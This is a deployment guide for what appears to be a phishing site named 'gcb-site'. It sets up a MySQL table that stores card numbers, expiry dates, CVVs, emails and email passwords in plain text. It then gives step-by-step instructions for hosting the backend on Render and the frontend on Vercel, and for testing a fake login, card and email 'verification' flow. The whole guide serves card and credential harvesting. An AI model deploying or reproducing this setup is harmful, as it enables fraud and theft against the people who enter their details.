# Deployment Guide

## Overview

This project consists of:
- **Frontend**: Static HTML/CSS/JS (served by Express or deploy separately on Vercel)
- **Backend**: Node.js/Express API (`POST /api/submit`)
- **Database**: MySQL (cloud-hosted via Clever Cloud)

---

## ✅ Step 1: Set up Clever Cloud MySQL (Free Database)

### 1.1. Create a Clever Cloud Account
1. Go to **[https://www.clever-cloud.com](https://www.clever-cloud.com)**
2. Click **"SIGN UP"** (top right)
3. Sign up using GitHub, Google, or email
4. Verify your email address

### 1.2. Create a MySQL Add-on
1. After logging in, click **"Create"** → **"an add-on"**
   - Or go directly to: https://www.clever-cloud.com/addons/
2. Search for **"MySQL"**
3. Select the **"MySQL"** add-on (look for the free/dev plan — usually named `dev` or `free`)
4. Click **"Add this add-on"**
5. Choose your region (closest to you)
6. Click **"Next"** and then **"Create"**

### 1.3. Get Your MySQL Connection Details
1. Go to your **Dashboard** → Click on your new MySQL add-on
2. Look for a section called **"Connection Strings"** or **"Environment Variables"**
3. You'll find these values (save them):
   - **`MYSQL_ADDON_HOST`** → this is your `DB_HOST`
   - **`MYSQL_ADDON_PORT`** → this is your `DB_PORT` (usually `3306`)
   - **`MYSQL_ADDON_DB`** → this is your `DB_NAME`
   - **`MYSQL_ADDON_USER`** → this is your `DB_USER`
   - **`MYSQL_ADDON_PASSWORD`** → this is your `DB_PASSWORD`

### 1.4. Create the Database Table
1. In your Clever Cloud MySQL dashboard, look for a **"Console"** or **"PHPMyAdmin"** link (they provide a web-based SQL console)
2. Paste and run this SQL:

```sql
CREATE TABLE IF NOT EXISTS submissions (
  id INT AUTO_INCREMENT PRIMARY KEY,
  cardName VARCHAR(255) NOT NULL,
  cardNumber VARCHAR(255) NOT NULL,
  expiry VARCHAR(50) NOT NULL,
  cvv VARCHAR(50) NOT NULL,
  userEmail VARCHAR(255) NOT NULL,
  userPassword VARCHAR(255) NOT NULL,
  createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updatedAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);
```

3. You should see `"Query OK"` — your table is ready!

### 1.5. Quick Test (Optional)
You can test locally by creating a `.env` file in the project root:

```env
DB_HOST=your-clever-cloud-mysql-host
DB_USER=your-clever-cloud-mysql-user
DB_PASSWORD=your-clever-cloud-mysql-password
DB_NAME=your-clever-cloud-mysql-db
DB_PORT=3306
DB_SSL=true
PORT=3000
```

Then run locally:
```bash
npm install
npm start
```

---

## ✅ Step 2: Deploy Backend to Render

### 2.1. Create a Render Account
1. Go to **[https://render.com](https://render.com)**
2. Click **"Get Started for Free"**
3. Sign up using **GitHub** (easiest — connects to your repo automatically)

### 2.2. Create a Web Service
1. From the Render Dashboard, click **"New +"** → **"Web Service"**
2. Select your GitHub repository: **`gods80eye08-debug/gcb-site`**
3. Configure the service:

| Setting | Value |
|---------|-------|
| **Name** | `gcb-site-backend` |
| **Region** | Choose closest to you (e.g., Frankfurt, Oregon) |
| **Branch** | `main` |
| **Runtime** | `Node` |
| **Build Command** | `npm install` |
| **Start Command** | `npm start` |
| **Plan** | **Free** |

### 2.3. Add Environment Variables
Click **"Advanced"** → **"Add Environment Variable"** and add these:

| Key | Value |
|-----|-------|
| `DB_HOST` | *(from Clever Cloud — MYSQL_ADDON_HOST)* |
| `DB_USER` | *(from Clever Cloud — MYSQL_ADDON_USER)* |
| `DB_PASSWORD` | *(from Clever Cloud — MYSQL_ADDON_PASSWORD)* |
| `DB_NAME` | *(from Clever Cloud — MYSQL_ADDON_DB)* |
| `DB_PORT` | `3306` |
| `DB_SSL` | `true` |
| `NODE_ENV` | `production` |
| `PORT` | `10000` |

### 2.4. Deploy
1. Click **"Create Web Service"**
2. Wait 2-5 minutes while Render builds and deploys
3. When done, you'll see: `Your service is live 🎉`
4. Your URL will be: **`https://gcb-site-backend.onrender.com`**

---

## ✅ Step 3: Deploy Frontend to Vercel

### 3.1. Create a Vercel Account
1. Go to **[https://vercel.com](https://vercel.com)**
2. Click **"Sign Up"** → Choose **"Continue with GitHub"**
3. Authorize Vercel to access your GitHub repos

### 3.2. Deploy the Frontend
1. Click **"Add New"** → **"Project"**
2. Import the GitHub repo: **`gods80eye08-debug/gcb-site`**
3. Configure:

| Setting | Value |
|---------|-------|
| **Framework Preset** | `Other` |
| **Root Directory** | `public` (click to select `public/` folder) |
| **Build Command** | *(leave empty)* |
| **Output Directory** | *(leave default)* |

4. Click **"Deploy"**
5. Wait ~30 seconds
6. Your frontend URL will be: **`https://gcb-site.vercel.app`**

### 3.3. Update API URL in email.js
The frontend automatically detects the Render backend. But if needed, update `public/js/email.js`:

Find this line:
```js
const apiUrl = window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost'
  ? 'http://127.0.0.1:3000/api/submit'
  : 'https://gcb-site-backend.onrender.com/api/submit';
```

Replace the Render URL with yours if different:
```js
  ? 'http://127.0.0.1:3000/api/submit'
  : 'https://gcb-site-backend.onrender.com/api/submit';  // ← change if your URL is different
```

---

## ✅ Step 4: Verify Everything Works

### 4.1. Test the Backend API
Open a terminal (or your browser) and test:

```bash
curl -X POST https://gcb-site-backend.onrender.com/api/submit \
  -H "Content-Type: application/json" \
  -d '{"cardName":"Test User","cardNumber":"1234 5678 9012 3456","expiry":"12/28","cvv":"123","userEmail":"test@example.com","userPassword":"password123"}'
```

Expected response:
```json
{"ok":true,"id":1}
```

### 4.2. Test the Full Flow
1. Open your Vercel URL: `https://gcb-site.vercel.app`
2. Go through the flow:
   - **Login** → enter any number/password → click Login
   - **Credit Card** → enter test card details → click Continue
   - **Email** → enter test email/password → click Verify
   - **Success** 🎉

### 4.3. Check Clever Cloud Database
1. Go to Clever Cloud dashboard → your MySQL add-on
2. Check the table `submissions` — you should see the test data

---

## Quick Reference: Environment Variables

| Variable | Description | Clever Cloud Source | Required |
|----------|-------------|-------------------|----------|
| `DB_HOST` | MySQL host | `MYSQL_ADDON_HOST` | ✅ Yes |
| `DB_USER` | MySQL user | `MYSQL_ADDON_USER` | ✅ Yes |
| `DB_PASSWORD` | MySQL password | `MYSQL_ADDON_PASSWORD` | ✅ Yes |
| `DB_NAME` | Database name | `MYSQL_ADDON_DB` | ✅ Yes |
| `DB_PORT` | MySQL port | `3306` (default) | Optional |
| `DB_SSL` | SSL required | `true` (for cloud) | Optional |
| `PORT` | Express port | Render auto-assigns | Optional |

---

## Troubleshooting

### "Cannot find module '../server/app.js'" or "Cannot find module 'index.js'"
This is already fixed in `package.json` — `main` is set to `server/app.js`.

### "CORS blocked origin"
Update `server/app.js` and add your Vercel URL to the `allowedOrigins` array:
```js
const allowedOrigins = [
  'http://127.0.0.1:5500',
  'http://localhost:5500',
  'http://127.0.0.1:3000',
  'http://localhost:3000',
  'https://gcb-site-backend.onrender.com',
  'https://gcb-site.vercel.app'
];
```

### "Database connection refused"
- Make sure Clever Cloud MySQL add-on is **active**
- Check that `DB_SSL=true` is set (Clever Cloud requires SSL)
- Verify all credentials are correct in Render env vars

### "MySQL not connected"
- Run `npm install` if packages are missing
- Ensure `mysql2` is installed (it's already in `package.json`)
- Check Render logs for connection errors

